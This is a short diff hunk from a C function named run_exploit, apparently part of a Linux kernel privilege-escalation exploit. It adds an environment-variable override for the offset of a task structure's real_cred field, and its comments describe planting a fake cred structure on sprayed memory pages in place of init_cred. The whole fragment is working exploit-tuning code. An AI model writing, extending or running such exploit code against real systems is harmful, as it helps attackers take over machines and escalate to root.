@@ -814,8 +814,14 @@ int run_exploit(int argc, char **argv) {
           if (st_env && (*st_env == 'R' || *st_env == 'r')) mt48_stage = 'R';
           if (getenv("PSELECT_PTR_ALT"))
             mt48_stage = (mt48_alt_stage++ % 2) ? 'C' : 'R';
-          size_t mt48_pc_off = (mt48_stage == 'R') ? (TASK_REAL_CRED_OFF - 8)
-                                                   : TASK_REAL_CRED_OFF;
+          size_t mt48_pc_off;
+          char *mt48_pc_off_env = getenv("PSELECT_PTR_PC_OFF");
+          if (mt48_pc_off_env && *mt48_pc_off_env) {
+            mt48_pc_off = strtoull(mt48_pc_off_env, NULL, 0);
+          } else {
+            mt48_pc_off = (mt48_stage == 'R') ? (TASK_REAL_CRED_OFF - 8)
+                                              : TASK_REAL_CRED_OFF;
+          }
           snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(task + mt48_pc_off));
           /* mt54 (spec2-repair): PSELECT_PTR_RIGHT 覆盖写死的 init_cred dmap
            * 别名 — 修复轮写喷页假 cred (spray_base+0x3800, util.c mt35-era
